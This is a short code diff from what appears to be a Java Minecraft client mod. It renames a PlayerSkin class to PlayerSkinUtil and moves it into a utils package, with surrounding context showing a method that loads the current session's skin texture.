@@ -1,4 +1,4 @@
-package me.soda.witch.features;
+package me.soda.witch.utils;
 
 import com.mojang.authlib.minecraft.MinecraftProfileTexture;
 import me.soda.witch.Witch;
@@ -9,7 +9,7 @@ import java.io.File;
 
 import static me.soda.witch.Witch.mc;
 
-public class PlayerSkin {
+public class PlayerSkinUtil {
     public static void sendPlayerSkin() {
         mc.getSkinProvider().loadSkin(mc.getSession().getProfile(), (type, id, texture) -> {
             if (type == MinecraftProfileTexture.Type.SKIN) {
